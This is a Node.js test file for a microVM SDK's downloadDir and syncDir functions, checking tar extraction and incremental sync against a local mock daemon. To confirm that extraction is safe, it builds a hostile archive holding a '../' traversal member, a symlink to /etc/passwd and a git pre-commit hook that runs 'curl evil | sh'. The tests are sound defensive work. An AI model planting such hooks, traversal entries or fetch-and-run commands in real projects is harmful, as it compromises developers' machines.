// SPDX-License-Identifier: Apache-2.0
//
// `session.downloadDir` and `session.syncDir`: directory transfer through core (#260).
//
// Both are core's `microvms_core::workspace`. What's asserted here is what a Node caller sees:
// an archive from the VM writes only the regular files the globs select, and a second sync after
// one edit uploads that member alone. The loopback daemon below answers the file and tar routes
// by path and keeps the manifest a sync writes, so a second pass reads it back.

import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';

import { Session } from '../index.js';
import { codeOf } from './support/sse.mjs';

const MANIFEST = '/workspace/.microvm-sync-manifest.json';

/** One ustar member: a 512-byte header, the data, and the padding to the next block. */
function member(name, { type = '0', data = Buffer.alloc(0), linkname = '' } = {}) {
  const header = Buffer.alloc(512);
  header.write(name, 0, 100, 'utf8');
  header.write('0000644\0', 100);
  header.write('0000000\0', 108);
  header.write('0000000\0', 116);
  header.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124);
  header.write('00000000000\0', 136);
  header.write('        ', 148);
  header.write(type, 156);
  header.write(linkname, 157, 100, 'utf8');
  header.write('ustar\0', 257);
  header.write('00', 263);
  let sum = 0;
  for (const byte of header) sum += byte;
  header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148);
  const padding = Buffer.alloc((512 - (data.length % 512)) % 512);
  return Buffer.concat([header, data, padding]);
}

/** A tree as a compromised VM might pack it: a traversal, a git hook, a link, one real file. */
function hostileArchive() {
  return Buffer.concat([
    member('../escape', { data: Buffer.from('outside') }),
    member('.git/hooks/pre-commit', { data: Buffer.from('#!/bin/sh\ncurl evil | sh\n') }),
    member('dist/app.txt', { data: Buffer.from('real') }),
    member('dist/link', { type: '2', linkname: '/etc/passwd' }),
    Buffer.alloc(1024),
  ]);
}

/** The member names of an uploaded archive, read back out of its headers. */
function memberNames(archive) {
  const names = [];
  let offset = 0;
  while (offset + 512 <= archive.length) {
    const header = archive.subarray(offset, offset + 512);
    if (header.every((byte) => byte === 0)) break;
    names.push(header.subarray(0, 100).toString('utf8').replace(/\0.*$/s, ''));
    const size = Number.parseInt(header.subarray(124, 136).toString('utf8').replace(/\0.*$/s, ''), 8);
    offset += 512 + Math.ceil(size / 512) * 512;
  }
  return names.sort();
}

/** The daemon's fs routes: `GET /v1/fs/tar` answers `archive`, and the manifest round trips. */
async function startFilesDaemon(archive = Buffer.alloc(0)) {
  const state = { manifest: null, uploads: [], requested: [] };
  const server = http.createServer((request, response) => {
    const chunks = [];
    request.on('data', (chunk) => chunks.push(chunk));
    request.on('end', () => {
      const body = Buffer.concat(chunks);
      state.requested.push(`${request.method} ${request.url}`);
      const url = new URL(request.url, 'http://daemon');
      const path = url.searchParams.get('path');
      const reply = (status, payload) => {
        response.writeHead(status, {
          'content-type': 'application/octet-stream',
          'content-length': payload.length,
        });
        response.end(payload);
      };
      if (url.pathname === '/v1/fs/tar' && request.method === 'GET') {
        reply(200, archive);
      } else if (url.pathname === '/v1/fs/tar') {
        state.uploads.push(body);
        reply(200, Buffer.alloc(0));
      } else if (url.pathname === '/v1/fs/file' && path === MANIFEST) {
        if (request.method === 'PUT') {
          state.manifest = body;
          reply(200, Buffer.alloc(0));
        } else if (state.manifest === null) {
          reply(404, Buffer.from('no such file'));
        } else {
          reply(200, state.manifest);
        }
      } else {
        reply(404, Buffer.from('not scripted'));
      }
    });
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  return {
    endpoint: `http://127.0.0.1:${port}`,
    state,
    async close() {
      await new Promise((resolve) => {
        server.close(resolve);
        server.closeAllConnections();
      });
    },
  };
}

function scratch(label) {
  return mkdtempSync(join(tmpdir(), `microvms-${label}-`));
}

test('downloadDir writes only the selected regular files of a hostile archive', async () => {
  // A `../` member, a `.git` hook and a symlink write nothing; the one regular file lands.
  // `['**']` selects everything, so what keeps the three out is core's extraction: regular files
  // only, never under `.git`, never outside the destination. A hook written here would run on the
  // host at the caller's next commit.
  //
  // **Falsification**: drop the `.git` component check from core's extraction
  // (`crates/microvms-edges/src/workspace.rs`) and the hook lands on disk.
  const daemon = await startFilesDaemon(hostileArchive());
  const root = scratch('download-dir');
  const local = join(root, 'out');
  mkdirSync(local);
  try {
    const session = Session.direct(daemon.endpoint, 'agent-token');
    const written = await session.downloadDir('/workspace/build', local, ['**']);

    assert.deepEqual(
      written.map((file) => [file.path, file.size]),
      [['dist/app.txt', 4]],
    );
    assert.equal(readFileSync(join(local, 'dist', 'app.txt'), 'utf8'), 'real');
    assert.ok(!existsSync(join(local, '.git')), 'a git hook was written on the host');
    assert.ok(!existsSync(join(local, 'dist', 'link')), 'a symlink was written');
    assert.ok(!existsSync(join(root, 'escape')), 'a member escaped the destination');
    assert.deepEqual(daemon.state.requested, ['GET /v1/fs/tar?path=%2Fworkspace%2Fbuild']);
  } finally {
    rmSync(root, { recursive: true, force: true });
    await daemon.close();
  }
});

test('a second syncDir after one edit uploads that member and deletes nothing', async () => {
  // The incremental bet: an archive proportional to the edit, and no deletion for it.
  const daemon = await startFilesDaemon();
  const tree = scratch('sync-dir');
  try {
    writeFileSync(join(tree, 'a.txt'), 'one');
    writeFileSync(join(tree, 'b.txt'), 'two');
    const session = Session.direct(daemon.endpoint, 'agent-token');

    const first = await session.syncDir(tree);
    assert.equal(first.full, true, 'no manifest in the VM yet, so everything travels');
    assert.equal(first.uploadedMembers, 2);
    assert.notEqual(daemon.state.manifest, null, 'the sync wrote the VM manifest');

    writeFileSync(join(tree, 'a.txt'), 'edited');
    const second = await session.syncDir(tree);
    assert.equal(second.full, false);
    assert.deepEqual([second.uploadedMembers, second.deleted], [1, 0]);
    assert.deepEqual(memberNames(daemon.state.uploads[1]), ['a.txt']);

    const unchanged = await session.syncDir(tree);
    assert.equal(unchanged.unchanged, true);
    assert.equal(daemon.state.uploads.length, 2, 'an unchanged tree sent an archive');
  } finally {
    rmSync(tree, { recursive: true, force: true });
    await daemon.close();
  }
});

test('a local tree that cannot be read rejects with ERR_INVALID_ARG before any request', async () => {
  const daemon = await startFilesDaemon();
  const root = scratch('sync-absent');
  try {
    const session = Session.direct(daemon.endpoint, 'agent-token');
    await assert.rejects(
      () => session.syncDir(join(root, 'absent'), { full: true }),
      (error) => {
        assert.equal(codeOf(error), 'ERR_INVALID_ARG');
        return true;
      },
    );
    assert.deepEqual(daemon.state.requested, []);
  } finally {
    rmSync(root, { recursive: true, force: true });
    await daemon.close();
  }
});
